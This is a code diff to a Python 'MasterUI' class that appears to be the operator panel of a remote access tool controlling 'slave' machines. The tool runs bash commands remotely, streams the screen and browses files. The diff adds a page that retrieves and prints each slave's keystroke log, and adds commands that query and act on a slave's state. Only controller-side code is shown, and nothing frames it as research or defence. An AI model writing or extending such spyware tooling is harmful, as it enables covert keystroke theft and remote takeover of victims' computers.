@@ -110,6 +110,13 @@ class MasterUI:
     def open_file(self, path: str, content: str, is_image: bool):
         self.call("setExplorerFile", path, content, is_image)
 
+    def update_state(self, state: dict):
+        self.call("setSlaveState", state)
+
+    def set_keylog(self, keylog: dict):
+        print(keylog)
+        self.call("setKeyLog", keylog)
+
 
     def fullscreen_set_frame_rate(self, frames):
         if self.is_fullscreen_open():
@@ -204,7 +211,7 @@ class MasterUI:
             def on_slave_open(api, slave_id: str):
                 ui.screen.start(slave_id)
                 ui._send(f"request slave {ui.active_slave} common_info")
-                # ui._send(f"request slave {ui.active_slave} local {ui.explorer.current_path}")
+                ui._send(f"request slave {ui.active_slave} state")
 
             def on_slave_close(api, slave_id: str):
                 if ui.active_slave == slave_id:
@@ -212,13 +219,21 @@ class MasterUI:
                 ui.set_screen(None)
 
             def on_page_change(api, page: str):
-                pass
+                if page == "keylog":
+                    ui._send(f"request slave {ui.active_slave} keylog")
 
             def on_group_toggle(api, name: str, collapsed: bool):
                 pass
 
             def on_bash_command(api, cmd: str):
                 ui._send(f"request slave {ui.active_slave} bash_execution {cmd}")
+
+            def on_state_action(api, item_id: str, action: str):
+                slave = ui.active_slave
+                if not slave:
+                    ui.send_announce("No slave selected", "warn")
+                    return
+                ui._send(f"request slave {slave} state_action {item_id} {action}")
 
             def on_screen_drop(api, data_url, filename):
                 pass
@@ -297,7 +312,6 @@ class MasterUI:
 
             def on_slave_group_changed(api, identifier: str, group: str | None):
                 ui._send(f"request group move_slave {encode_base64(identifier)} {encode_base64(group)}")
-                print(f"{identifier} -> {group}")
 
             def on_group_rename(api, old: str, new: str):
                 ui._send(f"request group rename {encode_base64(old)} {encode_base64(new)}")
@@ -312,6 +326,9 @@ class MasterUI:
                 ui.master.close()
                 ui.master = None
                 api.log_in(ui._password)
+
+            def print(api, message):
+                print("JS: " + str(message))
 
         # main UI
         constructor = WebConstructorDummy()
